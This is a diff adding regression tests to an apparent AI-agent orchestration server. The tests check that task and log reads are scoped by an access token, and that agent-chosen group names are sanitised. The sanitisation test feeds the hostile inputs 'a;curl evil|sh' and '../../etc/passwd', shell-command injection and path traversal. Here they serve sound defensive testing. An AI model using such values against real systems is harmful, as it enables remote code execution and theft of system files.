@@ -59,6 +59,8 @@ const post = (
   );
 const get = (app: (r: Request) => Promise<Response>, path: string) =>
   app(new Request(`http://x${path}`));
+const withToken = (app: (r: Request) => Promise<Response>, path: string, token: string) =>
+  app(new Request(`http://x${path}`, { headers: { "x-orch-token": token } }));
 
 test("an over-long journal is rejected with a reason the agent can act on", async () => {
   const { app } = harness();
@@ -1175,3 +1177,55 @@ test("what a question is about comes from a closed set", () => {
   expect(askKind(undefined)).toBe("other");
 });
 
+
+test("reads are scoped by the token too, not only writes", async () => {
+  // `/orch/task` and the lease log never called agentOf. The mailbox's `/orch/`
+  // prefix gate says which routes a sandbox can reach; it says nothing about who
+  // is reaching them, so any group could read any other group's cards and build
+  // logs by putting a number in the URL.
+  const { app, db } = harness();
+  db.run("INSERT INTO grp (project_id, name, status, created_at) VALUES (1, 'g2', 'RUNNING', 0)");
+  db.run(
+    "INSERT INTO agent (project_id, grp_id, role, model, token, created_at) VALUES (1, 2, 'engineer', 'sonnet', 'tok-other', 0)",
+  );
+  db.run("INSERT INTO task (grp_id, title, created_at) VALUES (1, 'g1 only', 0)");
+  db.run("INSERT INTO resource (name, template) VALUES ('browser', 'echo {url}')");
+  db.run(
+    "INSERT INTO lease (resource, grp_id, state, log_path, enqueued_at) VALUES ('browser', 1, 'done', '/tmp/nope.log', 0)",
+  );
+
+  expect((await get(app, "/orch/task")).status).toBe(401);
+  expect(await (await withToken(app, "/orch/task", "tok-eng")).text()).toContain("g1 only");
+  // The other group's engineer gets its own (empty) list, not this one's.
+  expect(await (await withToken(app, "/orch/task", "tok-other")).text()).not.toContain("g1 only");
+
+  expect((await get(app, "/orch/lease/1/log")).status).toBe(401);
+  expect((await withToken(app, "/orch/lease/1/log", "tok-other")).status).toBe(403);
+});
+
+test("a group name an agent chose is still branch-shaped", async () => {
+  // The name becomes `orch/<name>`, a docs/journal path, and an argument to a
+  // shell command in the group's own sandbox. It used to be whatever 40
+  // characters the splitting agent sent, `;` included.
+  const { app, db } = harness();
+  db.run("UPDATE grp SET status = 'PLANNING' WHERE id = 1");
+  db.run(
+    "INSERT INTO agent (project_id, grp_id, role, model, token, created_at) VALUES (1, 1, 'dispatcher', 'opus', 'tok-d', 0)",
+  );
+  const r = await post(
+    app,
+    "/orch/split",
+    {
+      group_id: 1,
+      requirements: [
+        { name: "a;curl evil|sh", idea: "first half" },
+        { name: "../../etc/passwd", idea: "second half" },
+      ],
+    },
+    "tok-d",
+  );
+  expect(r.status).toBe(200);
+  const names = db.query<{ name: string }, []>("SELECT name FROM grp WHERE id > 1").all().map((g) => g.name);
+  expect(names).toHaveLength(2);
+  for (const n of names) expect(n).toMatch(/^[a-z0-9][a-z0-9.-]*$/);
+});
